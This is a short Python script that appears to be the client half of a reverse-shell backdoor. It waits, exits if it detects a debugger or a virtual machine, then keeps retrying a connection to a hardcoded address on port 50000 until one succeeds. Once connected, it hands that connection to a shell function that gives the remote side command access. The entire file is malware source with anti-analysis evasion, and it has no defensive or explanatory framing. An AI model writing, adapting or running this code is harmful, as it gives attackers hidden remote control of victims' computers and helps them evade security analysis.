import sys
import time
import socket
from shell import shell
from Features.Features import Features

def main():
    time.sleep(20)
    
    serv_ip = "192.168.1.43"
    serv_port = 50000
    
    features = Features()
    
    features.hibernation(2, 0, 0, 0, 2)
    
    if features.is_debugging():
        sys.exit()
    if features.is_virtualizing():
        sys.exit()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            sock.connect((serv_ip, serv_port))
            break
        except socket.error:
            time.sleep(1)
            
    try:
        shell(sock)
    finally:
        sock.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()